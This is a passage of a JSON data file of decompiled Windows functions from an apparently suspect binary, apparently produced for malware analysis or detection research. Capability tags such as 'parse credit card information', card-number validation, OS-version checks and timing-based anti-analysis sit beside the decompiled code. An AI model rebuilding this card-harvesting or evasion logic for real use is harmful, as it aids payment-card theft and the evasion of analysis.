0x11;\ncode_r0x004023b8:\n        *(extraout_EDX + 0x11) = *(extraout_EDX + 0x11) + cVar8;\n        fcn.00403890(0x407490, uVar17, arg_10h, CONCAT22(uVar6, CONCAT11(uVar21, uVar19)));\n        iVar9 = extraout_EDX_00;\n    }\n    bVar14 = (POPCOUNT(iVar9 + (iVar9 >> 8)) & 1U) == 0;\n    fcn.00403890(0x407490, 0x11, 0x407360, 9);\n    if ((!bVar14) && (bVar14)) {\n        puVar10 = &stack0xffffffdf;\n        cVar13 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *unaff_EBP;\n            cVar13 = cVar13 + -1;\n        } while ('\\0' < cVar13);\n        uVar17 = in(0x78);\n        return CONCAT44(extraout_EDX_01, uVar17);\n    }\n    uVar19 = 0x16;\n    uVar21 = 0;\n    uVar6 = 0;\n    arg_10h = 0x40736c;\n    uVar17 = 0x11;\ncode_r0x00402408:\n    fcn.00403890(0x407490, uVar17, arg_10h, CONCAT22(uVar6, CONCAT11(uVar21, uVar19)));\n    uVar16 = fcn.00403890(0x407490, 0x11, 0x407384, 7);\n    return uVar16;\n}\n",
        "token_count": 2125
    },
    "00404100": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nbool fcn.00404100(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    pcbData = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)();\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 285
    },
    "004034c0": {
        "rules": [
            "calculate modulo 256 via x86 assembly",
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403615) overlaps instruction at (ram,0x00403612)\n// \n// WARNING: Removing unreachable block (ram,0x004034de)\n// WARNING: Removing unreachable block (ram,0x004034e5)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t fcn.004034c0(uint *param_1, uint *param_2, uint param_3, uint param_4, uint param_5, uint32_t param_6)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint extraout_ECX;\n    uint arg_8h;\n    int32_t extraout_ECX_00;\n    int32_t unaff_EBX;\n    int32_t iVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uint *puVar9;\n    bool bVar10;\n    uint8_t in_AF;\n    bool bVar11;\n    ulong uVar12;\n    uchar uStack108;\n    uint uStack107;\n    uint uStack8;\n    \n    uStack8 = 0;\n    uStack108 = 0;\n    puVar9 = &uStack107;\n    for (iVar5 = 0x18; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    iVar5 = puVar9 + 3;\n    *(puVar9 + 2) = 0;\n    puVar9 = &uStack8;\n    bVar11 = true;\n    bVar10 = false;\n    uVar12 = fcn.00403250(&uStack108, puVar9);\n    if ((!bVar11) && (bVar11)) {\n        uVar2 = uVar12;\n        if (bVar10 || unaff_EBX + 1 == 0) {\n            bVar10 = (POPCOUNT(uVar2 ^ 0xca) & 1U) == 0;\n            if ((bVar10) || (uVar4 = uVar12,  arg_8h = extraout_ECX,  !bVar10)) {\n                iVar5 = 7;\n                uVar4 = param_6;\n                arg_8h = param_5;\n            }\n            uVar3 = (uVar12 >> 0x20) + 1;\n            iVar6 = *0x8b17b43a;\n            uVar2 = uVar3;\n            *(uVar4 + 7) = (*(uVar4 + 7) - (arg_8h >> 8)) - (uVar2 < 0x8b);\n            iVar5 = fcn.004029f0(arg_8h, uVar3 & 0xffffff00 | uVar2 + 0x75, 0x407054, iVar5);\n            *(iVar6 + -4) = iVar5;\n            if (iVar5 != 0) {\n                *(iVar6 + -0x24) = 0;\n                puVar8 = iVar6 + -0x23;\n                for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n                *puVar8 = 0;\n                *(puVar8 + 2) = 0;\n                puVar8 = _sym.imp.MSVCRT.dll_rand;\n                bVar10 = false;\n                puVar7 = NULL;\n                bVar11 = true;\n                do {\n                    if ((!bVar10 && !bVar11) && (bVar10 || bVar11)) {\n                        puVar7 = puVar9;\n                    }\n                    uVar4 = (*puVar8)();\n                    uVar4 = uVar4 & 0x800000ff;\n                    if (uVar4 < 0) {\n                        uVar4 = (uVar4 - 1 | 0xffffff00) + 1;\n                    }\n                    *(iVar6 + -0x24 + puVar7) = uVar4;\n                    puVar7 = puVar7 + 1;\n                    bVar10 = puVar7 < 0x20;\n                    bVar11 = puVar7 == 0x20;\n                } while (bVar10);\n                if ((puVar7 < 0x21) || (0x20 < puVar7)) {\n                    puVar9 = *(iVar6 + -4);\ncode_r0x00403619:\n                    puVar8 = iVar6 + -0x24;\n                    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n                        *puVar9 = *puVar8;\n                        puVar8 = puVar8 + 1;\n                        puVar9 = puVar9 + 1;\n                    }\n                    fcn.00401370(*(iVar6 + 8), *(iVar6 + 0xc), *(iVar6 + 0x10), *(iVar6 + 0x14), iVar6 + -0x24, 0x20, \n                                 *(iVar6 + -4));\n                    fcn.00402a90(*(iVar6 + 0x18), *(iVar6 + 0x1c));\n                    return 1;\n                }\n                puVar9 = puVar8 + 1;\n                *puVar8 = *puVar7;\n                iVar6 = -0x741e7e30;\n                iVar5 = extraout_ECX_00;\n                do {\n                    if (SBORROW4(uVar4, uVar4) != false) goto code_r0x00403619;\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 == 0);\n                iVar5 = in(0x5d);\n            }\n            return iVar5;\n        }\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        piVar1 = (uVar12 & 0xffff0000 | CONCAT11((uVar12 >> 8) + in_AF, uVar2 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n    }\n    iVar5 = fcn.00403690(&uStack108, uStack8, 0x4074a8, 0xa2c0);\n    *param_1 = 0x4074a8;\n    *param_2 = 0xa2c0;\n    return iVar5;\n}\n",
        "token_count": 1490
    },
    "00403700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00403700(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.004037e0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x4074a4;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 219
    },
    "004037e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403860) overlaps instruction at (ram,0x0040385f)\n// \n\nvoid __cdecl fcn.004037e0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t extraout_ECX;\n    char unaff_BL;\n    uint *unaff_EDI;\n    bool bVar4;\n    unkbyte6 Var5;\n    \n    if (arg_ch == 1) {\n        fcn.00401a80();\n        uVar2 = fcn.00401530();\n        bVar4 = ((uVar2 & 0xff | ((uVar2 >> 8) - unaff_BL) + 0x4d << 8) & 0x26ae) == 1;\n        Var5 = fcn.00404900();\n        uVar3 = *0x42378c;\n        if ((!bVar4) && (bVar4)) {\n            uVar1 = in(Var5 >> 0x20);\n            *unaff_EDI = uVar1;\n            uVar3 = Var5;\n            if (&stack0xfffffff4 < 1) {\n                return;\n            }\n        }\n        uVar3 = uVar3 ^ 0xdee0ed6d;\n        *(extraout_ECX + 0x42378c) = *(extraout_ECX + 0x42378c);\n        if ((uVar3 & 0xffff0000 | uVar3 + (uVar3 >> 8) * -0x31) == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00403040();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 437
    },
    "004042b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404354) overlaps instruction at (ram,0x00404352)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004042b0(int32_t *hWnd)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t extraout_EDX;\n    uint *puVar9;\n    uint *in_FS_OFFSET;\n    char cVar10;\n    char cVar11;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4051e0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4073f8);\n    if (iVar4 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = iVar4;\n    uVar5 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x407404);\n    cVar11 = '\\0';\n    cVar10 = '\\0';\n    uVar3 = (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar5, 0, 0, 2, 1000, &lpdwResult);\n    if ((cVar11 == cVar10) && (cVar11 != cVar10)) {\n        puVar1 = iVar4 + -1;\n        uVar2 = *puVar1;\n        *puVar1 = *puVar1 + uVar3;\n        pcVar6 = sym.imp.KERNEL32.dll_GetProcAddress + CARRY1(uVar2, uVar3) + extraout_EDX;\n    }\n    else {\n        pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar4, 0x407418);\n    }\n    if (pcVar6 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar7 = (*pcVar6)(lpdwResult, str._D_3, 0, &var_20h);\n    if ((iVar7 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar7 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar7 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar7 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar7 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x004046de:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x004046ea:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar7 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar7 < 0) || (var_10h == NULL)) ||\n                       (iVar7 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar7 < 0)) {\njoined_r0x004046a5:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x004046ea;\n                    }\n                    if (pbstr == 0) {\njoined_r0x004044e1:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.004040d0(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar4 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x40742c);\n                        if (iVar4 != 0) goto joined_r0x004044e1;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar7 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar7 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x0040468a:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x004046de;\n                        }\n                        iVar7 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar4 = var_3ch;\n                        if (iVar7 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x0040468a;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar9 = &var_147h;\n                            for (iVar8 = 0x40; iVar8 != 0; iVar8 = iVar8 + -1) {\n                                *puVar9 = 0;\n                                puVar9 = puVar9 + 1;\n                            }\n                            *puVar9 = 0;\n                            *(puVar9 + 2) = 0;\n                            fcn.004040d0(iVar4, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar4 = fcn.004041f0(&var_148h);\n                            if (iVar4 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x004046a5;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h._0_1_ = 0;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            iVar4 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                iVar4 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar4);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar7;\n}\n",
        "token_count": 2638
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    uint *puVar1;\n    uint argv;\n    uint8_t *puVar2;\n    uint *in_FS_OFFSET;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint lpStartupInfo;\n    uint32_t var_30h;\n    uint var_2ch;\n    uchar *var_18h;\n    uint *var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x4061c0;\n    uStack16 = 0x4051a0;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack20;\n    var_18h = &stack0xffffff78;\n    var_4h = 0;\n    (*_sym.imp.MSVCRT.dll___set_app_type)(2);\n    *0x4237c0 = 0xffffffff;\n    *0x4237c4 = 0xffffffff;\n    puVar1 = (*_sym.imp.MSVCRT.dll___p__fmode)();\n    *puVar1 = *0x4237bc;\n    puVar1 = (*_sym.imp.MSVCRT.dll___p__commode)();\n    *puVar1 = *0x4237b8;\n    *0x4237c8 = *_sym.imp.MSVCRT.dll__adjust_fdiv;\n    fcn.0040519f();\n    if (*0x423770 == 0) {\n        (*_sym.imp.MSVCRT.dll___setusermatherr)(0x40519c);\n    }\n    fcn.0040518a();\n    sub.MSVCRT.dll__initterm(0x407008, 0x40700c);\n    var_6ch = *0x4237b4;\n    (*_sym.imp.MSVCRT.dll___getmainargs)(&var_60h, &var_70h, &var_64h, *0x4237b0, &var_6ch);\n    sub.MSVCRT.dll__initterm(0x407000, 0x407004);\n    puVar2 = *_sym.imp.MSVCRT.dll__acmdln;\n    if (*puVar2 != 0x22) {\n        do {\n            if (*puVar2 < 0x21) goto code_r0x00405113;\n            puVar2 = puVar2 + 1;\n        } while( true );\n    }\n    do {\n        puVar2 = puVar2 + 1;\n        if (*puVar2 == 0) break;\n    } while (*puVar2 != 0x22);\n    if (*puVar2 != 0x22) goto code_r0x00405113;\n    do {\n        puVar2 = puVar2 + 1;\ncode_r0x00405113:\n    } while ((*puVar2 != 0) && (*puVar2 < 0x21));\n    var_30h = 0;\n    (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(&lpStartupInfo);\n    if ((var_30h & 1) == 0) {\n        var_2ch._0_2_ = 10;\n    }\n    argv = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0, 0, puVar2, var_2ch);\n    var_68h = main(argv);\n    (*_sym.imp.MSVCRT.dll_exit)(var_68h);\n    sub.MSVCRT.dll__XcptFilter(**var_14h, var_14h);\n    return;\n}\n",
        "token_count": 840
    },
    "00403920": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403920(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    s = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x7024, *0x10 + -0x214, arg_8h);\n    fcn.00403f30(&var_4h, &var_8h);\n    fcn.00403a60(var_4h);\n    iVar1 = fcn.00402f00(&s, var_4h, var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.004011d0(&s, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 418
    },
    "00401000": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get session user name"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401000(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    // [00] -r-x section size 20480 named .text\n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)\n                      (0, &lpBuffer, &var_114h, &var_4h, *0x10 + -800, *0x10 + -0xc, 0xec);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, arg_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 292
    },
    "00402a90": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402a90(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iVar1;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    iVar1 = fcn.00401710(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x58) = arg_ch;\n    fcn.00401710(arg_8h_00, arg_ch_00, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 162
    },
    "00403250": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403420) overlaps instruction at (ram,0x0040341e)\n// \n\nfloat10 __cdecl fcn.00403250(uchar *arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    ushort uVar4;\n    uint16_t uVar5;\n    uint16_t uVar6;\n    char cVar7;\n    uint16_t in_AX;\n    uint in_ECX;\n    uint8_t uVar8;\n    int16_t in_DX;\n    uint unaff_EBX;\n    uint *puVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uchar *puVar12;\n    int32_t unaff_EDI;\n    int32_t iVar13;\n    bool bVar14;\n    bool bVar15;\n    bool in_SF;\n    bool bVar16;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    ushort uStack24175;\n    uint16_t uStack20;\n    uint16_t uStack18;\n    uint16_t uStack16;\n    \n    puVar10 = &stack0xfffffffc;\n    if ((!in_SF) && (in_SF)) {\n        *(unaff_EDI + 0x1c) = in_ST0;\n        in_ST0 = in_ST1;\n        in_ST1 = in_ST2;\n    }\n    *arg_8h = 0x65;\n    arg_8h[1] = 0xd7;\n    arg_8h[2] = 0xd;\n    bVar14 = false;\n    uVar8 = in_DX ^ unaff_EBX >> 8 | 0x67;\n    bVar15 = (POPCOUNT(uVar8) & 1U) == 0;\n    arg_8h[3] = 0x7b;\n    if ((bVar15) || (!bVar15)) {\n        arg_8h[4] = 0xf4;\n        uStack16 = in_AX;\n    }\n    else {\n        puVar10 = *0xc617b43a;\n        arg_8h = 0x34a96cf5;\n        uVar8 = in_DX + 1U;\n        bVar14 = 0xb < uVar8;\n        uVar8 = uVar8 - 0xc;\n        uStack16 = in_DX + 1U & 0xff00 | uVar8;\n    }\n    if ((!bVar14 && uVar8 != 0) && (bVar14 || uVar8 == 0)) {\n        uStack16 = uStack16 & 0xcc58;\n    }\n    arg_8h[5] = 0x6b;\n    uStack20 = in_ECX;\n    uStack18 = in_ECX >> 0x10;\n    while( true ) {\n        uVar6 = uStack16;\n        uStack16 = uStack18;\n        uVar5 = uStack20;\n        arg_8h[6] = 0xd0;\n        arg_8h[7] = 0xf6;\n        arg_8h[8] = 0x74;\n        arg_8h[9] = 0x5a;\n        uStack18 = uStack20;\n        uStack20 = arg_8h >> 0x10;\n        cVar7 = uVar6;\n        iVar13 = puVar10[2];\n        *(iVar13 + 10) = 0xf9;\n        if ((cVar7 < '\\x02') || ('\\x01' < cVar7)) break;\n        if (CONCAT22(uStack16, uVar5) != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    *(iVar13 + 0xb) = 0xd5;\n    bVar14 = uVar6 != unaff_EBX;\n    *(iVar13 + 0xc) = 8;\n    if ((bVar14) && (!bVar14)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *(iVar13 + 0xd) = 0x49;\n    bVar14 = (uVar5 - 5U & 0x44) != 0;\n    *(iVar13 + 0xe) = 0x6e;\n    puVar11 = puVar10;\n    if ((bVar14) && (!bVar14)) {\n        puVar9 = &uStack16;\n        puVar11 = &uStack16;\n        cVar3 = '\\x10';\n        do {\n            puVar10 = puVar10 + -1;\n            puVar9 = puVar9 + -1;\n            *puVar9 = *puVar10;\n            cVar3 = cVar3 + -1;\n        } while ('\\0' < cVar3);\n    }\n    *(iVar13 + 0xf) = 0xf6;\n    bVar16 = SBORROW1(cVar7, '\\x01');\n    bVar15 = cVar7 + -1 < '\\0';\n    bVar14 = cVar7 == '\\x01';\n    *(iVar13 + 0x10) = 0x6a;\n    if ((!bVar15) && (bVar15)) {\n        pcVar2 = iVar13 + 4;\n        pcVar1 = arg_8h + 4;\n        *(iVar13 + 0x1c) = in_ST0;\n        iVar13 = iVar13 + 5;\n        arg_8h = arg_8h + 5;\n        bVar16 = SBORROW1(*pcVar1, *pcVar2);\n        cVar7 = *pcVar1;\n        cVar3 = *pcVar2;\n        bVar15 = cVar7 - cVar3 < '\\0';\n        bVar14 = cVar7 == cVar3;\n        in_ST0 = in_ST1;\n    }\n    *(iVar13 + 0x11) = 0x1a;\n    if ((bVar14 || bVar16 != bVar15) || (!bVar14 && bVar16 == bVar15)) {\n        *(iVar13 + 0x12) = 0x54;\n    }\n    while( true ) {\n        uVar4 = uStack24175;\n        in_ST0 = in_ST0 - *(puVar11 + 0x47c692c9);\n        *(iVar13 + 0x13) = 0x76;\n        *(iVar13 + 0x14) = 0x8d;\n        uStack24175 = unaff_EBX >> 0x10;\n        uVar8 = uVar5 >> 8 ^ unaff_EBX;\n        bVar15 = uVar8 << 8 < 0;\n        bVar14 = uVar8 == 0;\n        *(iVar13 + 0x15) = 5;\n        puVar12 = arg_8h;\n        if ((!bVar14) && (bVar14)) {\n            puVar12 = arg_8h + 1;\n            out(*arg_8h, uVar4);\n        }\n        *(iVar13 + 0x16) = 0xd6;\n        if ((bVar14 || bVar15) || (!bVar14 && !bVar15)) break;\n        arg_8h = puVar12;\n        if (CONCAT22(uStack16, uVar5) != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    *puVar11[3] = 0x17;\n    return in_ST0;\n}\n",
        "token_count": 1703
    },
    "00401990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
